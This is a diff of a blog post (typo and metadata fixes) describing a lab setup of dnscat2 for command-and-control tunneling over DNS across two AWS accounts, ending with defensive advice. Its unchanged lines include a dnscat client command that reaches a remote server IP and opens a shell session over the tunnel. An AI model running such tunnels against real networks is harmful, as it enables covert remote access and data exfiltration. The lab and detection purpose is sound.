@@ -1,19 +1,21 @@
 ---
 title: "dnscat2: Command and Control over the DNS"
 date: 2020-08-15
+description: "Set up dnscat2 across two AWS accounts to see how attackers tunnel command-and-control over DNS, and how to defend against it."
+tags: [aws, dns, c2, red-team, detection]
 ShowToc: true
 ---
 No matter how tightly you restrict outbound access from your network, you probably allow DNS protocol to at least one server. Adversaries can abuse this access in your firewall to establish stealthy Command and Control (C2) channels or to exfiltrate data that is difficult to block. To understand the use of DNS for C2 tunneling, let’s take a look at Ron Bowes’s tool [dnscat2](https://github.com/iagox86/dnscat2), which makes it relatively easy to experiment with such attack techniques.
 
 
-As per the dnscat2 documentation, author describes this tool as - 
+In the dnscat2 documentation, the author describes this tool as - 
 > a DNS tunnel that WON'T make you sick and kill you! 
 
 This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.
 
-Even though instrutions to setup dnscat2 are pretty straightforward, I came across several error messages while trying to make it work. Leaving my notes here for my future self and for everyone esle who is trying to play around with this tool. We will be making use of two AWS acounts, one for client and other for server and configurations can be found below:
+Even though the instructions to set up dnscat2 are pretty straightforward, I came across several error messages while trying to make it work. I'm leaving my notes here for my future self and for everyone else who is trying to play around with this tool. We will be using two AWS accounts, one for the client and the other for the server. The configurations are below:
 
-![](/images/DNScat2.jpg)
+![dnscat2 lab architecture across two AWS accounts](/images/DNScat2.jpg)
 
 ![Bastion Host security groups inbound rules](/images/DNScat2_Bastion_Host_1.jpg)
 
@@ -21,7 +23,7 @@ Even though instrutions to setup dnscat2 are pretty straightforward, I came acro
 
 ![DNS Client security groups inbound rules](/images/DNScat2_Private_Server_1.jpg)
 
-![DNS Client security group outbound rules](/images/DNScat2_Private_Server_1.jpg)
+![DNS Client security group outbound rules](/images/DNScat2_Private_Server_2.jpg)
 
 dnscat2 comes in two parts: the client and the server.
 
@@ -82,7 +84,7 @@ Build and run dnscat2 client on bastion host machine
 Replace the x.x.x.x with the public IP of the DNS Server's EC2 instance.
 
 ```shell
-ubuntu@@ip-172-31-33-167::~/dnscat2/client$ ./dnscat --dns server=18.212.67.90,port=53 --secret=6190b0ad9dff0d1483d89fcfa869ab60
+ubuntu@ip-172-31-33-167:~/dnscat2/client$ ./dnscat --dns server=18.212.67.90,port=53 --secret=6190b0ad9dff0d1483d89fcfa869ab60
 Creating DNS driver:
  domain = (null)
  host   = 0.0.0.0
@@ -165,7 +167,7 @@ sh (ip-172-31-33-167) 4> /home/ubuntu/dnscat2/client
 ### How to defend against C2 tunneling over DNS?
 
 - Limit the number of DNS servers that systems on your network are allowed to reach to not only complicate the adversary’s tunneling setup, but also to limit the types of DNS interactions you need to oversee.
-- If possible, direct DNS activities through a set of DNS servers that you control, so you can keep an eye on them and tweak there configuration when necessary.
+- If possible, direct DNS activities through a set of DNS servers that you control, so you can keep an eye on them and tweak their configuration when necessary.
 - Monitor DNS activities for anomalies, looking at DNS server or network logs. The use of DNS for C2 tends to exhibit timing and payload deviations that might allow you to spot misuse.
 
 ## References
